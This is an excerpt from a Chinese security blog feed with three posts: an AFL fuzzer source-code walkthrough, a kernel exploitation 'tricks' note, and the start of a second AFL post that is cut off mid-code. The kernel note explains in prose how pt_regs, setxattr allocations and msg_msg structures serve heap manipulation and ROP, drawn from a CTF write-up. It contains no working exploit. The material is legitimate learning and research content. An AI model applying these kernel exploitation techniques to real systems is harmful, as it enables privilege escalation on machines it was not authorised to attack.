href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h2><p>接下来调用<code>perform_dry_run(use_argv)</code>，这是一个十分核心的函数，函数注释: <strong>Perform dry run of all test cases to confirm that the app is working as expected. This is done only for the initial inputs, and only once.</strong> 大致含义为：试运行所有初始的测试用例以确保应用可以正确运行，且仅执行一次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> <span class="hljs-built_in">queue</span>;<br>u32 cal_failures = <span class="hljs-number">0</span>;<br>u8* skip_crashes = getenv(<span class="hljs-string">&quot;AFL_SKIP_CRASHES&quot;</span>);<br><br><span class="hljs-keyword">while</span> (q) &#123;<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>函数开头首先对输入队列进行遍历，queue相关变量含义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> *<span class="hljs-title">queue</span>,     /* <span class="hljs-title">Fuzzing</span> <span class="hljs-title">queue</span> (<span class="hljs-title">linked</span> <span class="hljs-title">list</span>)      */</span><br><span class="hljs-class">                          *<span class="hljs-title">queue_cur</span>, /* <span class="hljs-title">Current</span> <span class="hljs-title">offset</span> <span class="hljs-title">within</span> <span class="hljs-title">the</span> <span class="hljs-title">queue</span>  */</span><br><span class="hljs-class">                          *<span class="hljs-title">queue_top</span>, /* <span class="hljs-title">Top</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">list</span>                  */</span><br><span class="hljs-class">                          *<span class="hljs-title">q_prev100</span>;</span> <span class="hljs-comment">/* Previous 100 marker              */</span><br></code></pre></td></tr></table></figure><p>在<code>while(q)</code>部分中，首先根据路径，打开输入文件并传入变量<code>use_mem</code>，接着调用函数进行检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(q)&#123;<br>    ...<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *读取样本数据，传入use_mem</span><br><span class="hljs-comment">    */</span><br>    u8* fn = <span class="hljs-built_in">strrchr</span>(q-&gt;fname, <span class="hljs-string">&#x27;/&#x27;</span>) + <span class="hljs-number">1</span>;<br><br>    ACTF(<span class="hljs-string">&quot;Attempting dry run with &#x27;%s&#x27;...&quot;</span>, fn);<br><br>    fd = open(q-&gt;fname, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    use_mem = ck_alloc_nozero(q-&gt;len);<br><br>    <span class="hljs-keyword">if</span> (read(fd, use_mem, q-&gt;len) != q-&gt;len)<br>      FATAL(<span class="hljs-string">&quot;Short read from &#x27;%s&#x27;&quot;</span>, q-&gt;fname);<br><br>    close(fd);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *调用calibrate_case校准测试用例</span><br><span class="hljs-comment">    */</span><br>    res = calibrate_case(argv, q, use_mem, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<span class="hljs-comment">/* Calibrate a new test case. This is done when processing the input directory</span><br><span class="hljs-comment">   to warn about flaky or otherwise problematic test cases early on; and when</span><br><span class="hljs-comment">   new paths are discovered to detect variable behavior and so on. */</span><br>    ck_free(use_mem);<br>    <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们关注一下<code>calibrate_case</code>函数的流程：</p><ol><li>初始化设置，user_tmout、stage_name、stage_max</li><li>判断 forkserver 状态，若未启动，则调用 <code>init_forkserver()</code>初始化</li><li>进入循环，对用例进行测试，循环为一下步骤<ul><li>调用<code>write_to_testcase()</code>，将输入写入测试文件</li><li>调用<code>runtarget()</code>，fuzz目标程序并监控</li><li>检测是否出现crash或新路径，并更新位图，记录测试相关状态</li><li>当存在新tuple，调用<code>update_bitmap_score()</code>，来确定”more favorable path”</li><li>若不存在，则反馈给父进程</li></ul></li></ol><p>简化后的函数源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 <span class="hljs-title function_">calibrate_case</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv, <span class="hljs-keyword">struct</span> queue_entry* q, u8* use_mem,</span><br><span class="hljs-params">                         u32 handicap, u8 from_queue)</span> &#123;<br>  ...<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *初始化</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (!from_queue || resuming_fuzz)<br>    use_tmout = MAX(exec_tmout + CAL_TMOUT_ADD,<br>                    exec_tmout * CAL_TMOUT_PERC / <span class="hljs-number">100</span>);<br>  ...<br>  stage_name = <span class="hljs-string">&quot;calibration&quot;</span>;<br>  stage_max  = fast_cal ? <span class="hljs-number">3</span> : CAL_CYCLES;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *forkserver</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (dumb_mode != <span class="hljs-number">1</span> &amp;&amp; !no_forkserver &amp;&amp; !forksrv_pid)<br>    init_forkserver(argv);<br>  ...<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *loop</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">for</span> (stage_cur = <span class="hljs-number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;<br>    ...<br>    write_to_testcase(use_mem, q-&gt;len);<br>    fault = run_target(argv, use_tmout);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*判断是否存在新路径</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">if</span> (stop_soon || fault != crash_mode) <span class="hljs-keyword">goto</span> abort_calibration;<br>    <span class="hljs-keyword">if</span> (!dumb_mode &amp;&amp; !stage_cur &amp;&amp; !count_bytes(trace_bits)) &#123;<br>      fault = FAULT_NOINST;<br>      <span class="hljs-keyword">goto</span> abort_calibration;<br>    &#125;<br>    cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*存在新路径</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">if</span> (q-&gt;exec_cksum != cksum) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *更新位图</span><br><span class="hljs-comment">  */</span><br>      hnb = has_new_bits(virgin_bits);<br>      <span class="hljs-keyword">if</span> (hnb &gt; new_bits) new_bits = hnb;<br>  ...<br>  &#125;<br>  ...<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  *确定more favorable path</span><br><span class="hljs-comment">  */</span><br>  update_bitmap_score(q);<br>  ...<br> <span class="hljs-comment">/*</span><br><span class="hljs-comment"> *不存在新路径</span><br><span class="hljs-comment"> */</span><br>abort_calibration:<br>  ...<br><br>&#125;<br></code></pre></td></tr></table></figure><p>基本到这里该函数就结束了，剩下的部分都是一些错误信息处理相关内容</p><p><img src="/img/article/fuzzAFL2/image-20230904183850138.png" alt="image-20230904183850138"></p><h2 id="fuzzer与forkserver通信"><a href="#fuzzer与forkserver通信" class="headerlink" title="fuzzer与forkserver通信"></a>fuzzer与forkserver通信</h2><p>在这里我们停顿一下，梳理下fuzzer与forkserver通信的大致流程。首先我们要知道，实际用于fuzz的子进程并不有fuzzer fork得到，而是由fuzzer 启动的forkserver进行fork得到，如图所示</p><p><img src="/img/article/fuzzAFL2/1632794033_615275b15953b258b38cd.png" alt="1632794033_615275b15953b258b38cd"></p><p>两者之间通信我们可以由下图观之</p><p><img src="/img/article/fuzzAFL2/1632794034_615275b20ecc5e3dc8f7d.png" alt="1632794034_615275b20ecc5e3dc8f7d"></p><blockquote><p> 其中<code>__afl_maybe_log()</code>在源码分析part1中可以看到，其实就是插桩代码的核心函数</p></blockquote><p>首先，<code>afl-fuzz</code>会创建两个管道：状态管道和控制管道，然后执行目标程序。此时的目标程序的<code>main()</code>函数已经被插桩，程序控制流进入<code>__afl_maybe_log</code>中。如果fuzz是第一次执行，则此时的程序就成了fork server们之后的目标程序都由该fork server通过fork生成子进程来运行。fuzz进行过程中，fork server会一直执行fork操作，并将子进程的结束状态通过状态管道传递给<code>afl-fuzz</code>。</p><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><p>回到主函数，接下来即将进入主循环。再次之前会调用<code>cull_queue()</code>函数，对队列进行精简。主要是通过遍历<code>top_rated[]</code>条目，然后标记<strong>favored</strong>条目</p><p>这里的处理流程可以举个例子理解，现假设有如下tuple和seed信息：</p><ul><li><strong>tuple</strong>: t0, t1, t2, t3, t4</li><li><strong>seed</strong>: s0, s1, s2</li><li>初始化<code>temp_v = [1,1,1,1,1]</code></li><li>s1可覆盖t2, t3，s2覆盖t0, t1, t4，并且top_rated[0] &#x3D; s2，top_rated[2]&#x3D;s1</li></ul><p>将按照如下过程进行筛选和判断：</p><ol><li>首先判断 temp_v[0]&#x3D;1，说明t0没有被覆盖；</li><li>top_rated[0] 存在 (s2) -&gt; 判断s2可以覆盖的范围 -&gt;<code>trace_mini = [1,1,0,0,1]</code>；</li><li>更新<code>temp_v=[0,0,1,1,0]</code>， 标记s2为 “favored”；</li><li>继续判断 temp_v[1]&#x3D;0，说明t1此时已经被覆盖，跳过；</li><li>继续判断 temp_v[2]&#x3D;1，说明t2没有被覆盖；</li><li>top_rated[2] 存在 (s1) -&gt; 判断s1可以覆盖的范围 -&gt;<code>trace_mini=[0,0,1,1,0]</code>；</li><li>更新<code>temp_v=[0,0,0,0,0]</code>，标记s1为 “favored”；</li><li>此时所有tuple都被覆盖，具备”favored’标记的为s1, s2，过程结束。</li></ol><h2 id="主循环"><a href="#主循环" class="headerlink" title="主循环"></a>主循环</h2><p>接下来便要进入主循环，简化版代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    u8 skipped_fuzz;<br><br>    cull_queue();<span class="hljs-comment">//favored</span><br><br>    <span class="hljs-keyword">if</span> (!queue_cur) &#123;<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">      *队列为空，代表已经完成一轮，此处剩余部分为一些参数处理</span><br><span class="hljs-comment">      */</span><br>      ...<br><br>    &#125;<br><br>    skipped_fuzz = fuzz_one(use_argv);<span class="hljs-comment">//核心fuzz case代码</span><br>   ...<br><br>  &#125;<br></code></pre></td></tr></table></figure><p>可以看到主要流程便是<code>cull_queue()</code>–&gt;<code>fuzz_one()</code>，不断循环往复。由于<code>fuzz_one</code>的代码量过长，这里只做功能和流程分析：</p><ol><li>根据是否有<code>pending_favored</code>和<code>queue_cur</code>的情况，按照概率进行跳过；有<code>pending_favored</code>, 对于已经fuzz过的或者non-favored的有99%的概率跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored；</li><li>假如当前项有校准错误，并且校准错误次数小于3次，那么就用calibrate_case进行测试；</li><li>如果测试用例没有修剪过，那么调用函数trim_case对测试用例进行修剪；</li><li>修剪完毕之后，使用calculate_score对每个测试用例进行打分；</li><li>如果该queue已经完成deterministic阶段，则直接跳到havoc阶段；</li><li>deterministic阶段变异4个stage，变异过程中会多次调用函数common_fuzz_stuff函数，保存interesting 的种子：<ul><li>bitflip，按位翻转，1变为0，0变为1</li><li>arithmetic，整数加&#x2F;减算术运算</li><li>interest，把一些特殊内容替换到原文件中</li><li>dictionary，把自动生成或用户提供的token替换&#x2F;插入到原文件中</li><li>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异。</li><li>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件。</li></ul></li><li>该轮完成。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本AFL流程由两篇文章叙述，由于时间问题，不能将每个文件与函数分析透彻。比如像样本变异策略这样的核心内容并无介绍，但也希望对大家的AFL学习理解有所帮助。</p><p>文章如有纰漏，请在评论区指出，我会及时修改。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【Kernel】一些trick记录（持续更新）</title>
    <link href="/2023/09/01/%E3%80%90Kernel%E3%80%91%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E7%BB%93%E6%9E%84%E4%BD%93%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/09/01/%E3%80%90Kernel%E3%80%91%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E7%BB%93%E6%9E%84%E4%BD%93%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h2><p>用于保存<strong>用户态–&gt;内核态</strong>切换时的用户态信息，在内核态返回时会从<code>pt_regs</code>恢复数据。因而若我们能控制rsp到达此位置，即可以使用用户态寄存器值辅助实现ROP</p><p><img src="/img/article/ktrick/t01bacb0bd7eee5eeaa.png" alt="img"></p><h2 id="list-head结构体"><a href="#list-head结构体" class="headerlink" title="list_head结构体"></a>list_head结构体</h2><p>简单的内核双链表结构，在内核中经常作为实现双链表结构的基础，定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//https://elixir.bootlin.com/linux/latest/source/include/linux/types.h#L184</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="setxattr系统调用"><a href="#setxattr系统调用" class="headerlink" title="setxattr系统调用"></a>setxattr系统调用</h2><blockquote><p>从a3✌的d3kheap中学到的东西，a3✌也太超人了吧！！！原文链接如下：</p><p><a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 - arttnba3’s blog</a></p></blockquote><p>setxattr 是一个十分独特的系统调用族，抛开其本身的功能，在 kernel 的利用当中他可以为我们提供<strong>近乎任意大小的内核空间 object 分配</strong></p><p>观察setxattr源码，发现如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_setxattr()<br>    path_setxattr()<br>        setxattr()<br></code></pre></td></tr></table></figure><p>在<code>setxattr()</code>函数中有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span><br><span class="hljs-title function_">setxattr</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dentry *d, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *name, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *value,</span><br><span class="hljs-params">     <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>        kvalue = kvmalloc(size, GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!kvalue)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        <span class="hljs-keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;<br><br>    <span class="hljs-comment">//,..</span><br><br>    kvfree(kvalue);<br><br>    <span class="hljs-keyword">return</span> error;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 value 和 size 都是由我们来指定的，即<strong>我们可以分配任意大小的 object 并向其中写入内容</strong>，完成写入之后该 object 又会通过 kvfree 被释放掉，因此我们便可以通过 setxattr <strong>多次修改 victim 的内容</strong></p><h2 id="msg-queue消息队列"><a href="#msg-queue消息队列" class="headerlink" title="msg_queue消息队列"></a>msg_queue消息队列</h2><blockquote><p>同样来自a3✌的blog， a3✌简直是我Kernel的启蒙老师😭😭😭</p><p><a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 - arttnba3’s blog</a></p></blockquote><p>The syscall about system V message queue</p><ul><li>msgget：create a msg queue</li><li>msgsnd：send msg to a msg queue</li><li>msgrcv：recive msg from a msg queue</li></ul><p>System will create a structure named <strong>msg_queue</strong> when we create a message queue. Here is the definition of this structure.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msq_queue structure for each present queue on the system */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* last msgsnd time */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* last msgrcv time */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* last change time */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* current number of bytes on queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* number of messages in queue */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* max number of bytes on queue */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* pid of last msgsnd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* last receive pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>When we try to call <code>msgsnd</code> to send a message to a specified message queue, such a srturcture is created in kernel space:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>实际结构如下：</p><p><img src="/img/article/ktrick/5IcVxRaFQtg3HCW.png" alt="image.png"></p><hr><blockquote><p>下面这些留个坑，有空补上</p></blockquote><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><h2 id="tty-struct"><a href="#tty-struct" class="headerlink" title="tty struct"></a>tty struct</h2><h2 id="seq-operation"><a href="#seq-operation" class="headerlink" title="seq operation"></a>seq operation</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【fuzz】AFL源码分析 part 1</title>
    <link href="/2023/08/30/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%201/"/>
    <url>/2023/08/30/%E3%80%90fuzz%E3%80%91AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20part%201/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本来想一周内完成，看来要延期了，尽量希望能在这几天内完成吧，31号晚上还有qax的一面😭😭，水平果然还是太次了。</p><p>项目地址：<a href="https://github.com/google/AFL">google&#x2F;AFL(github.com)</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AFL，全称“American Fuzzy Lop”，是由安全研究员Michal Zalewski开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率（代码执行路径的覆盖情况），以此进行反馈，对输入样本进行调整以提高覆盖率，从而提升发现漏洞的可能性。AFL可以针对有源码和无源码的程序进行模糊测试，其设计思想和实现方案在模糊测试领域具有十分重要的意义。</p><h3 id="各模块简要说明"><a href="#各模块简要说明" class="headerlink" title="各模块简要说明"></a>各模块简要说明</h3><blockquote><p>源码模块图像一览，图源来自文章：<a href="https://www.freebuf.com/articles/others-articles/290197.html">AFL二三事 - FreeBuf</a>，侵删</p></blockquote><p><img src="/img/article/fuzzAFL1/1632794006_615275964fc6378475599.png" alt="1632794006_615275964fc6378475599"></p><h4 id="插桩模块"><a href="#插桩模块" class="headerlink" title="插桩模块"></a><strong>插桩模块</strong></h4><ul><li><code>afl-as.h, afl-as.c, afl-gcc.c</code>：普通插桩模式，针对源码插桩，编译器可以使用gcc， clang；</li><li><code>llvm_mode</code>：llvm 插桩模式，针对源码插桩，编译器使用clang；</li><li><code>qemu_mode</code>：qemu 插桩模式，针对二进制文件插桩。</li></ul><h4 id="fuzzer-模块"><a href="#fuzzer-模块" class="headerlink" title="fuzzer 模块"></a><strong>fuzzer 模块</strong></h4><ul><li><code>afl-fuzz.c</code>：fuzzer 实现的核心代码，AFL 的主体。</li></ul><h4 id="其他辅助模块"><a href="#其他辅助模块" class="headerlink" title="其他辅助模块"></a><strong>其他辅助模块</strong></h4><ul><li><code>afl-analyze</code>：对测试用例进行分析，通过分析给定的用例，确定是否可以发现用例中有意义的字段；</li><li><code>afl-plot</code>：生成测试任务的状态图；</li><li><code>afl-tmin</code>：对测试用例进行最小化；</li><li><code>afl-cmin</code>：对语料库进行精简操作；</li><li><code>afl-showmap</code>：对单个测试用例进行执行路径跟踪；</li><li><code>afl-whatsup</code>：各并行例程fuzzing结果统计；</li><li><code>afl-gotcpu</code>：查看当前CPU状态。</li></ul><h4 id="部分头文件说明"><a href="#部分头文件说明" class="headerlink" title="部分头文件说明"></a><strong>部分头文件说明</strong></h4><ul><li><code>alloc-inl.h</code>：定义带检测功能的内存分配和释放操作；</li><li><code>config.h</code>：定义配置信息；</li><li><code>debug.h</code>：与提示信息相关的宏定义；</li><li><code>hash.h</code>：哈希函数的实现定义；</li><li><code>types.h</code>：部分类型及宏的定义。</li></ul><h2 id="普通插桩"><a href="#普通插桩" class="headerlink" title="普通插桩"></a>普通插桩</h2><h3 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h3><p><strong>afl-gcc.c</strong>本质上是对GCC 和 clang的封装，正如其在注释中写到的<em>wrapper for GCC and clang</em>。最常见的使用方式，便是在使用**.&#x2F;configure**时，直接将afl-gcc或着afl-clang的路径传给CC；同理对于C++代码，只需用afl-g++或者afl-clang++路径传给CXX即可。</p><p>几个静态全局变量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8*  as_path;                <span class="hljs-comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span><br><span class="hljs-type">static</span> u8** cc_params;              <span class="hljs-comment">/* Parameters passed to the real CC  */</span><br><span class="hljs-type">static</span> u32  cc_par_cnt = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* Param count, including argv0      */</span><br><span class="hljs-type">static</span> u8   be_quiet,               <span class="hljs-comment">/* Quiet mode                        */</span><br>            clang_mode;             <span class="hljs-comment">/* Invoked as afl-clang*?            */</span><br></code></pre></td></tr></table></figure><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>main函数的核心主体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>  ......<br>      <br>  find_as(argv[<span class="hljs-number">0</span>]);<br>    <br>  edit_params(argc, argv);<br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);<br><br>  ......<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>find_as</code>: try to find our “fake” GNU assembler in AFL_PATH or at the location derived from argv[0]. If that fails, abort.</li><li><code>edit_params</code>: Copy argv to <strong>cc_params</strong>, making the necessary edits.</li><li><code>execvp</code>: 执行命令</li></ul><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>在<code>edit_params</code>中，关键逻辑如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 